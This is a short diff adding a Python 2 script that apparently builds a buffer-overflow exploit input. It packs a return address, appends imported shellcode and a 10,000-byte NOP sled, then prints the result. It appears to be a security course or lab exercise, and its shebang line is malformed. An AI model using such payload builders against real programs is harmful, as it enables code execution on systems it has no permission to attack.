@@ -1,0 +1,9 @@
+c/usr/bin/env python2
+
+from shellcode import shellcode
+from struct import pack
+
+# Padding goes here
+p = pack('<I', 0x40000000)+ shellcode +"\x90"*10000
+
+print p
